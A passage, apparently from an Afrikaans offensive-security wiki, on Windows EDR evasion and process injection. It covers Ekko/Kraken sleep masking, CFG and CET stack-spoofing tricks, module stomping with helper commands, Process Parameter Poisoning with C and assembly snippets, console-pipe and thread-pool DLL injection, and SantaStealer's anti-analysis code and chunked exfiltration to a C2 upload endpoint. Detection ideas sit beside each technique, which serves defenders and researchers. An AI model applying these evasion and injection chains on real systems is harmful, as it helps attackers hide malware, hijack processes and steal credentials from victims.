- Gebruik ’n Aggressor-script om teiken-APIs te registreer sodat Beacon en BOFs deursigtig by dieselfde evasion-pad baat vind, sonder kodeveranderinge.

Detection/DFIR-oorwegings
- IAT-integriteit: entries wat na nie-image- (heap/anon-) adresse oplos; periodieke verifikasie van import-pointers.
- Stack-anomalieë: return addresses wat nie aan gelaaide images behoort nie; skielike oorgange na nie-image-PIC; inkonsekwente RtlUserThreadStart-afstamming.
- Loader-telemetrie: in-process-skrywes na IAT, vroeë DllMain-aktiwiteit wat import-thunks wysig, onverwagte RX-areas wat tydens laai geskep word.
- Image-load-evasion: as jy LoadLibrary* hook, monitor verdagte laaie van automation/clr-assemblies wat met memory-masking-gebeure korreleer.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT-patching tydens laai uitvoer (bv. TitanLdr, AceLdr)
- Memory-masking-hooks (bv. simplehook) en stack-cutting-PIC (stackcutting)
- PIC call-stack-spoofing-stubs (bv. Draugr)


## IAT-hooking tydens import + sleep obfuscation (Crystal Palace/PICO)

### IAT-hooks tydens import via ’n inwonende PICO

As jy ’n reflective loader beheer, kan jy imports **tydens** `ProcessImports()` hook deur die loader se `GetProcAddress`-pointer met ’n pasgemaakte resolver te vervang wat eers hooks nagaan:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Bou ’n **inwonende PICO** (’n persistente PIC-object) wat voortbestaan nadat die tydelike loader-PIC homself bevry het.
- Eksporteer ’n `setup_hooks()`-funksie wat die loader se import-resolver oorheers (bv. `funcs.GetProcAddress = _GetProcAddress`).
- Slaan ordinal-imports in `_GetProcAddress` oor en gebruik ’n hash-gebaseerde hook-opsoek soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, gee dit terug; anders delegeer na die werklike `GetProcAddress`.
- Registreer hook-teikens tydens linktyd met Crystal Palace `addhook "MODULE$Func" "hook"`-inskrywings. Die hook bly geldig omdat dit binne die inwonende PICO leef.

Dit lewer **IAT-omleiding tydens import** op sonder om die gelaaide DLL se kodeafdeling ná laai te patch.

### Dwing hookbare imports af wanneer die teiken PEB-walking gebruik

Hooks tydens import word net geaktiveer as die funksie werklik in die teiken se IAT voorkom. As ’n module APIs via ’n PEB-walk + hash oplos (sonder ’n import-inskrywing), dwing ’n werklike import af sodat die loader se `ProcessImports()`-pad dit kan opspoor:

- Vervang hash-gebaseerde export-resolusie (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte verwysing soos `&WaitForSingleObject`.
- Die compiler genereer ’n IAT-inskrywing, wat onderskepping moontlik maak wanneer die reflective loader imports oplos.

### Ekko-styl sleep/idle-obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitiewe** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang wagte, omring die oproep met ’n Ekko-styl obfuscation-ketting wat die image in geheue tydens idle enkripteer:<sup>[[31]](#references)[[27]](#references)</sup>

- Gebruik `CreateTimerQueueTimer` om ’n reeks callbacks te skeduleer wat `NtContinue` met saamgestelde `CONTEXT`-frames aanroep.
- Tipiese ketting (x64): stel die image op `PAGE_READWRITE` → RC4-enkripteer die hele gemapte image via `advapi32!SystemFunction032` → voer die blokkerende wag uit → RC4-dekripteer → **herstel toestemmings per afdeling** deur PE-afdelings te deurloop → dui voltooiing aan.
- `RtlCaptureContext` verskaf ’n `CONTEXT`-sjabloon; kloon dit in verskeie frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap aan te roep.

Operasionele besonderheid: gee “success” terug vir lang wagte (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon verberg die module vir scanners tydens idle-vensters en vermy die klassieke “gepatchte `Sleep()`”-handtekening.

Detection-idees (telemetrie-gebaseer)
- Uitbarstings van `CreateTimerQueueTimer`-callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot, aaneenlopende buffers ter grootte van ’n image gebruik word.
- Groot omvang van `VirtualProtect` gevolg deur pasgemaakte herstel van toestemmings per afdeling.

### Runtime CFG-registrasie vir sleep-obfuscation-gadgets

Op CFG-geaktiveerde teikens sal die eerste indirekte sprong na ’n mid-function-gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die module se CFG-metadata voorkom nie. Om Ekko/Kraken-styl-kettings binne geharde prosesse aan die gang te hou:<sup>[[30]](#references)</sup>

- Registreer elke indirekte bestemming wat die ketting gebruik met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID`-inskrywings.
- Vir adresse binne gelaaide images (`ntdll`, `kernel32`, `advapi32`) moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volle image-grootte** dek.
- Gebruik eerder die **allocation base** en allocation-grootte vir handmatig gemapte/PIC/stomped-areas.
- Merk nie net die dispatch-gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event-syscalls) en enige aanvaller-beheerde uitvoerbare afdelings wat indirekte teikens sal word.

Dit verander ROP/JOP-styl-sleep-kettings van “werk net in nie-CFG-prosesse” in ’n herbruikbare primitief vir `explorer.exe`, browsers, `svchost.exe` en ander endpoints wat met `/guard:cf` saamgestel is.

### CET-veilige stack spoofing vir slapende threads

Volledige `CONTEXT`-vervanging is opvallend en kan op CET Shadow Stack-stelsels breek omdat ’n vervalste `Rip` steeds met die hardeware-shadow stack moet ooreenstem. ’n Veiliger sleep-masking-patroon is:<sup>[[30]](#references)</sup>

- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB`-/TEB-stackgrense (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Rugsteun die huidige thread se werklike TEB/TIB.
- Neem die werklike slapende context vas met `GetThreadContext`.
- Kopieer **slegs** die werklike `Rip` na die spoof-context en laat die vervalste `Rsp`/stacktoestand onveranderd.
- Kopieer tydens die slaapvenster die spoof-thread se `NT_TIB` na die huidige TEB, sodat stack walkers binne ’n geldige stackreeks unwind.
- Herstel die oorspronklike TIB en thread context nadat die wag voltooi is.

Dit behou ’n CET-konsekwente instruction pointer terwyl dit EDR-stack walkers mislei wat TEB-stackmetadata vertrou om unwinds te valideer.

### APC-gebaseerde alternatief: Kraken Mask

As timer-queue-dispatch te herkenbaar is, kan dieselfde sleep-encrypt-spoof-restore-volgorde vanaf ’n opgeskorte helper-thread uitgevoer word met queued APCs:<sup>[[27]](#references)</sup>

- Skep ’n helper-thread met `NtTestAlert` as entrypoint.
- Queue voorbereide `CONTEXT`-frames/APCs met `NtQueueApcThread` en dreineer dit met `NtAlertResumeThread`.
- Stoor die kettingtoestand op die heap eerder as op die helper-stack om te voorkom dat die verstek 64 KB thread-stack uitgeput word.
- Gebruik `NtSignalAndWaitForSingleObject` om die start event atomies aan te dui en te blokkeer.
- Suspend die hooftread voordat jy die TIB/context herstel (`NtSuspendThread` → herstel → `NtResumeThread`) om die tydvenster te verklein waarin ’n scanner ’n half-herstellende stack kan opspoor.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue`-handtekening met ’n helper-thread/APC-handtekening, terwyl dieselfde RC4-masking- en stack-spoofing-doelwitte behoue bly.

Bykomende detection-idees
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC-dispatch.
- `GetThreadContext`/`SetThreadContext` rondom `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe`.
- `NtQueryInformationThread` gevolg deur direkte skrywes na die huidige thread se TEB/TIB-stackgrense.
- `NtQueueApcThread`/`NtAlertResumeThread`-kettings wat indirek `SystemFunction032`, `VirtualProtect` of helpers vir die herstel van toestemmings per afdeling bereik.
- Herhaalde gebruik van kort gadget-handtekeninge soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch-pivots binne ondertekende modules.


## Presisie-module-stomping

Module stomping voer payloads uit die **`.text`-afdeling van ’n DLL wat reeds binne die teikenproses gemap is** uit, in plaas daarvan om ooglopende private uitvoerbare geheue toe te ken of ’n nuwe opofferende DLL te laai. Die oorwryfteiken moet ’n **gelaaide, skyf-gesteunde image** wees waarvan die koderuimte die payload kan huisves sonder om kodepaaie te beskadig wat die proses steeds nodig het.<sup>[[1]](#references)[[2]](#references)</sup>

### Betroubare teikenkeuse

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is broos: die DLL is dalk nie in die afgeleë proses gelaai nie, en ’n te klein kode-area sal die proses laat crash. ’n Betroubaarder werksvloei is:

1. Lys die teikenproses se modules op en behou ’n **name-only-include-lys** van DLLs wat reeds gelaai is.
2. Bou eers die payload en teken die **presiese grootte in grepe** aan.
3. Skandeer kandidaat-DLLs op skyf en vergelyk die PE-afdeling se **`.text` `Misc_VirtualSize`** met die payload-grootte. Dit is belangriker as die lêergrootte omdat dit die grootte van die uitvoerbare afdeling **wanneer dit in geheue gemap is** weerspieël.
4. Ontleed die **Export Address Table (EAT)** en kies ’n geëksporteerde funksie-RVA as die stomp-beginoffset.
5. Bereken die **impakgebied**: as die payload die gekose funksiegrens oorskry, sal dit aangrensende exports wat daarna in geheue geplaas is, oorwryf.

Tipiese recon-/keusehelpers wat in die praktyk voorkom:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasionele notas
- Verkies DLL's wat **reeds gelaai** is in die afgeleë proses om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat die teikentoepassing selde uitvoer; anders kan normale kodepaaie die gestompte grepe tref voor of ná draadskepping.
- Groot implants vereis dikwels dat shellcode-inbedding verander word van 'n string literal na 'n **byte-array/braced initializer**, sodat die volledige buffer korrek in die injector-bronkode voorgestel word.

Opsporingsidees
- Afgeleë skryfbewerkings na image-backed uitvoerbare bladsye (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX-allocasies.
- Export-inskryfpunte waarvan die grepe in geheue nie meer ooreenstem met die backing file op skyf nie.
- Afgeleë drade of context pivots wat begin uitvoer binne 'n wettige DLL-export waarvan die eerste grepe onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)` / `WriteProcessMemory`-reekse teen DLL `.text`-bladsye, gevolg deur draadskepping.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) is 'n **process-injection / EDR-evasion**-tegniek wat die klassieke afgeleë skryfpad (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om grepe na 'n reeds lopende teiken te kopieer, buit dit die feit uit dat Windows **geselekteerde `CreateProcessW`-opstartparameters na die kinderproses kopieer** en dit binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Nuttige carriers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese beperkings vir carriers:

- `lpCommandLine` moet na **skryfbare geheue** wys vir `CreateProcessW`, en is beperk tot **32,767 Unicode-karakters**, insluitend die nulterminator.
- `lpEnvironment` moet 'n Unicode-omgewingsblok wees van opeenvolgende `NAME=VALUE\0`-stringe wat met 'n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, dus moet die `ShellInfo`-kartering as 'n implementasiebesonderheid beskou word, eerder as 'n stabiele, gedokumenteerde kontrak.

Dit maak normale prosesskepping die **payload-oordragprimitief**. Die operateur skep die kinderproses met aanvallerbeheerde opstartdata en laat Windows die kopie tussen prosesse uitvoer.

### Afgeleë opsoekvloei sonder afgeleë skryf-API's

Nadat die kind geskep is, bepaal die ligging van die gekopieerde buffer met **slegs-lees-primitiewe**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die afgeleë `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde wyser:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimale vloei:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Uitvoering van die gekopieerde parameterbuffer

Die gekopieerde parameterstreek is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3-ketting is:

1. Skep die proses normaalweg (nie opgeskort nie)
2. Maak die gekose parameterbladsy uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die hoofthread-handle wat reeds in `PROCESS_INFORMATION` teruggestuur is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread-hijacking-werkvloeie, **vereis** dit nie `SuspendThread` / `ResumeThread` nie; die konteks kan direk op die teruggestuurde hoofthread-handle verander word.

Dit vermy verskeie API’s wat algemeen vir injection gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Nulbyte-beperking en gefaseerde shellcode

Al drie draers is **string- of stringagtige data**, dus word ’n rou payload wat `0x00` bevat tydens oordrag afgekap. ’n Praktiese oplossing is ’n **nulvrye eerste fase** wat konstantes tydens looptyd herbou en dan ’n arbitrêre tweede fase laai.

’n Eenvoudige patroon is XOR-gebaseerde konstantesintese:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dit laat die eerste stadium toe om stack-strings, API-argumente, DLL-paaie of ’n tweede-stadium shellcode-loader te bou sonder om null-grepe in die oorgedraagde parameter in te sluit.

### Stack-gebaseerde API-aanroepe vanaf die eerste stadium

Wanneer die eerste stadium API’s soos `LoadLibraryA` moet aanroep, kan dit:

- die string/buffer op die teiken se stack plaas
- die **32-byte x64-shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe pointers stel
- `RSP` **16-greep-belyn** hou voor die aanroep

’n Tweede stadium kan dan vanaf die stack na ’n `PAGE_READWRITE`-toekenning gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word en daarheen gespring word, waardeur ’n direkte RWX-toekenning vermy word.

### Opsporingsidees

Goeie geleenthede vir ondersoek wat deur die outeurs genoem word:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **prosesparameterbladsye uitvoerbaar maak**
- daardie beskermingsverandering gevolg deur `SetThreadContext` / `NtSetContextThread`
- afgeleë lesings van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang / hoë-entropie `lpCommandLine`-, `lpEnvironment`- of `STARTUPINFO.lpReserved`-waardes tydens prosesskepping

### Notas

- P3 is ’n **oordragtruuk tussen prosesse**, nie op sigself ’n volledige uitvoeringsprimitief nie: die gekopieerde parameter benodig steeds ’n verandering van uitvoertoestemming en ’n metode om uitvoering daarheen te herlei.
- `RtlCreateProcessReflection` / Dirty Vanity is deur die outeurs oorweeg, maar verwerp omdat dit intern verdagte primitiewe soos `NtWriteVirtualMemory` en `NtCreateThreadEx` aanroep.

Vir payload-aflewering in ’n **bestaande** Windows-proses deur middel van thread-beskrywings, gevolg deur die kaping van die terugkeeradres van ’n wagtende thread, sien [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN-pypinspuiting

’n Interaktiewe konsole-child kan ook as die **payload-oordragprimitief** gebruik word. Die injector herlei die child se standaardinvoer na ’n pyp en stuur ’n merker gevolg deur shellcode. Nadat die konsoleprogram die data in sy eie private geheue ingelees het, vind die injector daardie buffer, maak dit uitvoerbaar en herlei ’n child-thread daarheen. Dit vermy `VirtualAllocEx` en `WriteProcessMemory`, maar dit is steeds process injection eerder as ’n algemene EDR-bypass.<sup>[[41]](#references)</sup>

Ondanks die beskrywing as ’n “named-pipe” roep die verwysingsimplementering `CreatePipe` aan, wat ’n **anonieme pyp** skep. Windows implementeer anonieme pype intern met uniek benoemde pypobjekte, maar die PoC kies nie ’n `\\.\pipe\<name>`-pad nie en roep ook nie `CreateNamedPipe` aan nie. Dit skep oorerfbare handles met ’n versteksekuriteitsbeskrywer, plaas die lees-handle in `STARTUPINFO.hStdInput`, stel `STARTF_USESTDHANDLES` en begin ’n nuwe child met handle-oorerwing geaktiveer. Daarom begin hierdie PoC die verskafde konsole-uitvoerbare lêer; dit koppel nie sy pyp aan ’n bestaande proses nie.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Verwysingswerkvloei

Die implementering gebruik die volgende ketting:<sup>[[41]](#references)</sup>

1. Skep pare anonieme pype vir die child se `STDIN` en `STDOUT`. Verwyder oorerwing van die twee handles aan die ouerkant en maak die duplikate aan die child-kant in die ouer toe nadat die proses geskep is.
2. Begin ’n interaktiewe uitvoerbare lêer soos `netsh.exe` of `nslookup.exe` met `CREATE_NEW_CONSOLE`. Die child erf die herleide standaardhandles.
3. Stuur die volledige binêre `rawData`-skikking met `WriteFile` deur die `STDIN`-handle aan die ouerkant. Die konsoleprogram verwerk die grepe en laat ’n kopie in een van sy private vasgelegde geheuegebiede agter.
4. Loop deur die child se adresruimte met `VirtualQueryEx`, lees kandidaat-`MEM_PRIVATE`-gebiede met `ReadProcessMemory` en soek na die merker aan die begin van `rawData`.
5. Verander die ontdekte buffer na `PAGE_EXECUTE_READWRITE` met `VirtualProtectEx`.
6. Identifiseer die hoofdraad, skort dit op, stel `RIP` met `NtSetContextThread` op `found_address + 0x19` en hervat dit.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die verskafde implementering is x64-spesifiek: dit wysig `CONTEXT.Rip`, en sy ingebedde payload is x64-shellcode. `rawData` begin met ’n merker van 25 grepe, dus begin uitvoerbare grepe by heksadesimale offset `0x19`. Wanneer jy die payload vervang, behou daardie uitleg of werk die merker, soekvektor, skikkinggrootte en uitvoeringsoffset saam op. Die bronkommentaar lys ook `0x0A`, `0x0D` en `0x1A` as bad characters. Hierdie workflow verander nie die kindproses se token of voorregte nie.<sup>[[41]](#references)</sup>

Vir klein native helpers en payload-kompilasiepatrone, sien [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-pool callback DLL-inspuiting sonder shellcode (DLLParty)

DLLParty pas PoolParty-styl thread-pool-inspuiting aan sodat ’n bestaande teiken-worker `LoadLibraryA` aanroep, eerder as om ’n ingespuite callback-stub uit te voer. Sy dispatch-primitief is ’n `TP_DIRECT`-completion wat na die teikenpool se I/O-completion-port in die tou geplaas word. Dit omseil nie prosesregte nie: die PoC roep `OpenProcess(PROCESS_ALL_ACCESS)` aan en benodig leesbare/skryfbare teikengeheue, plus dupliceerbare worker-factory- en completion-port-handvatsels.<sup>[[46]](#references)[[47]](#references)</sup>

Op Windows x64 gee die worker ’n wyser na sy stapelgesteunde `TP_CALLBACK_INSTANCE` in `RCX` deur, die eerste callback-argument. `LoadLibraryA` interpreteer dieselfde wyser as ’n `LPCSTR`. Op die getoetste pad bou `TppWorkerThread` die wyser by `RSP+0x178`, terwyl sy eerste gewone skryfbewerking in daardie objek by `RSP+0x1d0` plaasvind. ’n Nul-terminerende DLL-pad wat binne hierdie voorvoegsel van 0x58 grepe pas, kan dus aan die begin van die instansie geplaas word sonder om voor dispatch oorskryf te word. Dit is ’n waarneming wat van die bouweergawe afhang, nie ’n gedokumenteerde Windows ABI-waarborg nie.<sup>[[46]](#references)[[47]](#references)</sup>

Die verwysingsworkflow is:<sup>[[46]](#references)[[47]](#references)</sup>

1. Lys die teiken se handvatsels met `NtQuerySystemInformation(SystemHandleInformation)` en identifiseer `TpWorkerFactory` deur objeksoorte te bevraagteken. Dupliseer ’n worker-factory-handvatsel en bevraagteken `WorkerFactoryBasicInformation`; `StartParameter` gee die afgeleë `TP_POOL`. Slaan fabrieke met `TotalWorkerCount == 0` oor.
2. Lees `TP_POOL.CompletionPort` en deurloop die pool se private worker-lys. Op die getoetste Windows 10 19045 x64-bouweergawe (`ntdll.dll 10.0.19041.4842`) is die kop by `pool+0x60`; elke skakel is by `worker+0x10`, dus is die callback-instance-gleuf by `worker+0x38` gelyk aan `link+0x28`. Die PoC kontroleer wyserbelyning, skakelwederkerigheid, pooleienaarskap, nie-nul-draad-ID's, herhaalde nodes en ’n stabiele lyskop.
3. Skryf die DLL-pad na **elke** teruggevonde worker-gleuf, want enige worker kan die tougeplaaste completion verbruik. Plaas ’n `TP_DIRECT` met `Callback = LoadLibraryA` in skryfbare teikengeheue. Die PoC gebruik `last_slot-0x500` op ’n worker-stapel in plaas van `VirtualAllocEx`; daardie offset is eksperimenteel en moet nie met aktiewe stapeldata bots nie.
4. Dupliseer die teiken se completion-port-handvatsel en roep `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` aan. Die afgeleë `TP_DIRECT`-adres is die completion-sleutel. ’n Bestaande worker roep dan `LoadLibraryA` aan met sy oorskryfde callback-instance-wyser en laai ’n DLL waartoe die teiken reeds toegang het.

Die PoC ontvang ’n teiken-PID (`DLLParty.exe <target_pid>`) en gebruik ’n hardgekodeerde DLL-pad in `DLLParty.cpp`; stel ’n pad in wat vir die teiken toeganklik is voordat jy ’n x64-uitvoerbare lêer bou. Dit gebruik ook die `LoadLibraryA`-adres van sy eie proses as die afgeleë callback, en aanvaar dus dat daardie adres in die teiken geldig is. Die kode kontroleer nie of die padlengte binne die voorvoegsel van 0x58 grepe pas nie, of dat die deurloop van workers ’n gleuf gevind het voordat die laaste element geïndekseer word nie. Bevestig weer die private offsets, stapeluitleg en skryfbare ruimte vir die teikenbouweergawe. Die weglating van `CreateRemoteThreadEx`, shellcode en `VirtualAllocEx` skakel kruisprosesskrywings of DLL-laaitelemetrie nie uit nie.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer se tradecraft vir lêerlose ontduiking en geloofsdiefstal

SantaStealer (ook bekend as BluelineStealer) wys hoe moderne info-stealers AV-omseiling, anti-analise en geloofstoegang in een workflow kombineer.<sup>[[24]](#references)</sup>

### Sleutelborduitlegfiltrering en sandbox-vertraging

- ’n Konfigurasievlag (`anti_cis`) lys geïnstalleerde sleutelborduitlegte met `GetKeyboardLayoutList`. As ’n Cyrilliese uitleg gevind word, laat die sample ’n leë `CIS`-merker agter en beëindig dit voordat stealers loop. So ontplof dit nooit in uitgeslote streke nie, terwyl dit ’n artefak vir threat hunting agterlaat.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Gelaagde `check_antivm`-logika

- Variant A loop deur die proseslys, bereken ’n hash van elke naam met ’n pasgemaakte rollende kontrolesom en vergelyk dit met ingebedde bloklyste vir debuggers/sandboxes; dit herhaal die kontrolesom vir die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B ondersoek stelseleienskappe (minimum prosesgetal, onlangse looptyd), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox-byvoegings op te spoor en doen tydmetings rondom sluimertye om enkelstap-uitvoering te herken. Enige treffer laat die uitvoering staak voordat modules begin.

### Lêerlose helper + dubbele ChaCha20-reflektiewe laai

- Die primêre DLL/EXE bevat ’n Chromium-geloofsbriewe-helper wat óf na skyf geskryf óf handmatig in geheue gekarteer word; in lêerlose modus los dit self invoere/herverskuiwings op, sodat geen helper-artefakte geskryf word nie.
- Dié helper stoor ’n tweede-fase-DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-greep-sleutels + 12-greep-nonces). Ná albei dekripsiestappe laai dit die blob reflektief (geen `LoadLibrary` nie) en roep die uitvoere `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, wat van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) afgelei is.<sup>[[25]](#references)</sup>
- Die ChromElevator-roetines gebruik reflektiewe prosesholmaak met direkte syscalls om in ’n aktiewe Chromium-blaaier in te spuit, AppBound Encryption-sleutels te erf en wagwoorde/koekies/kredietkaartdata direk uit SQLite-databasisse te dekripteer, ondanks ABE-verharding.

### Modulêre versameling in geheue en HTTP-uitfiltrering in stukke

- `create_memory_based_log` loop deur ’n globale `memory_generators`-funksiewysertabel en begin een thread per geaktiveerde module (Telegram, Discord, Steam, skermkiekies, dokumente, blaaieruitbreidings, ens.). Elke thread skryf resultate na gedeelde buffers en rapporteer sy lêertelling ná ’n aansluitingsvenster van ongeveer 45 sekondes.
- Wanneer dit klaar is, word alles met die staties gekoppelde `miniz`-biblioteek as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` sluimer dan 15 sekondes en stuur die argief in stukke van 10 MB via HTTP POST na `http://<C2>:6767/upload`, terwyl dit ’n blaaier se `multipart/form-data`-grens (`----WebKitFormBoundary***`) namaak. Elke stuk bevat `User-Agent: upload`, `auth: <build_id>`, opsioneel `w: <campaign_tag>`, en die laaste stuk voeg `complete: true` by sodat die C2 weet dat hersamestelling voltooi is.

## References

- [1] [Gevorderde ontduikingstegnieke: Presisie-module-stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Oproepstapels: nie meer gratis passe vir wanware nie](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentasie](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – voorbeeld](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – voorbeeld](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC vir vervalsing van oproepstapels](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuwe infeksieketting en ConfuserEx-gebaseerde verduistering vir DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Moet jy jou zero trust vertrou? Omseiling van Zscaler-houdingkontroles](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Voor ToolShell: Verkenning van Storm-2603 se vorige ransomware-bedrywighede](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Misbruik van aangestuurde uitvoere](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11-inventaris van aangestuurde uitvoere (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Soekvolgorde vir dinamieskakelbiblioteke](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prosessekuriteit en toegangsregte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-verwysing (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-lanseerder](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Weerstaan EDR’s met die ondersteuning van Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Breek die beskermende dop van Windows Defender met die vouerherleidingstegniek](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Verwysing vir die mklink-opdrag](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Onder die Pure Curtain: Van RAT tot bouer tot kodeerder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kom dorp toe: ’n Nuwe, ambisieuse infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Dekripsie van Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
